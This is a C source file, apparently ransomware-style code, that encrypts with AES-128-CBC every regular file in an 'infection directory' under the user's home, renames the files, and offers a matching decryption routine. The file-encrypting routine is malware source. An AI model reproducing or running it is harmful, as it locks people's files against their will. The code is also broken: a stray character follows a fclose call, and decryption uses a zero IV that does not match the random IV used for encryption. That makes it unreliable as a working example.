#include "encryption.h"

void handle_errors() {
    ERR_print_errors_fp(stderr);
    abort();
}

void encrypt_file(const char *filename, const unsigned char *key, const unsigned char *iv) {
    FILE *in_file = fopen(filename, "rb");
    FILE *out_file = fopen("temp.enc", "wb");
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char buffer[1024];
    unsigned char cipher_buffer[1024 + EVP_MAX_BLOCK_LENGTH];
    int len;
    int cipher_len;

    if (!in_file || !out_file || !ctx) {
        handle_errors();
    }

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv)) {
        handle_errors();
    }

    while ((len = fread(buffer, 1, 1024, in_file)) > 0) {
        if (1 != EVP_EncryptUpdate(ctx, cipher_buffer, &cipher_len, buffer, len)) {
            handle_errors();
        }
        fwrite(cipher_buffer, 1, cipher_len, out_file);
    }

    if (1 != EVP_EncryptFinal_ex(ctx, cipher_buffer, &cipher_len)) {
        handle_errors();
    }
    fwrite(cipher_buffer, 1, cipher_len, out_file);

    EVP_CIPHER_CTX_free(ctx);
    fclose(in_file);
    fclose(out_file);z

    rename("temp.enc", filename);
}

void decrypt_file(const char *filename, const unsigned char *key, const unsigned char *iv) {
    FILE *in_file = fopen(filename, "rb");
    FILE *out_file = fopen("temp.dec", "wb");
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char buffer[1024];
    unsigned char plain_buffer[1024 + EVP_MAX_BLOCK_LENGTH];
    int len;
    int plain_len;

    if (!in_file || !out_file || !ctx) {
        handle_errors();
    }

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv)) {
        handle_errors();
    }

    while ((len = fread(buffer, 1, 1024, in_file)) > 0) {
        if (1 != EVP_DecryptUpdate(ctx, plain_buffer, &plain_len, buffer, len)) {
            handle_errors();
        }
        fwrite(plain_buffer, 1, plain_len, out_file);
    }

    if (1 != EVP_DecryptFinal_ex(ctx, plain_buffer, &plain_len)) {
        handle_errors();
    }
    fwrite(plain_buffer, 1, plain_len, out_file);

    EVP_CIPHER_CTX_free(ctx);
    fclose(in_file);
    fclose(out_file);

    rename("temp.dec", filename);
}

void encrypt_files() {
    // Path to the infection directory
    char path[256];
    snprintf(path, sizeof(path), "%s%s", HOME, INFECTION_DIR);

    // Generate a random key and IV
    unsigned char key[KEY_SIZE];
    unsigned char iv[IV_SIZE];
    if (!RAND_bytes(key, sizeof(key)) || !RAND_bytes(iv, sizeof(iv))) {
        handle_errors();
    }

    // Print key and IV for decryption purposes
    printf("Encryption Key: ");
    for (int i = 0; i < KEY_SIZE; i++) printf("%02x", key[i]);
    printf("\nIV: ");
    for (int i = 0; i < IV_SIZE; i++) printf("%02x", iv[i]);
    printf("\n");

    // Open the directory and encrypt each file
    DIR *dir = opendir(path);
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char filepath[512];
            snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);
            encrypt_file(filepath, key, iv);
            rename_file(filepath);
        }
    }
    closedir(dir);
}

void decrypt_files(const char *key_hex) {
    // Path to the infection directory
    char path[256];
    snprintf(path, sizeof(path), "%s%s", HOME, INFECTION_DIR);

    // Convert hex key to binary
    unsigned char key[KEY_SIZE];
    for (int i = 0; i < KEY_SIZE; i++) {
        sscanf(&key_hex[i * 2], "%2hhx", &key[i]);
    }

    // Use a known IV (must be same as used for encryption)
    unsigned char iv[IV_SIZE] = {0}; // Use the same IV as used during encryption

    // Open the directory and decrypt each file
    DIR *dir = opendir(path);
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char filepath[512];
            snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);
            if (strstr(filepath, ".ft")) {
                decrypt_file(filepath, key, iv);
                // Rename the file back to original
                char original_filepath[512];
                memcpy(original_filepath, filepath, strlen(filepath) - 3);
                original_filepath[strlen(filepath) - 3] = '\0'; // Manually null-terminate the string
                rename(filepath, original_filepath);
            }
        }
    }
    closedir(dir);
}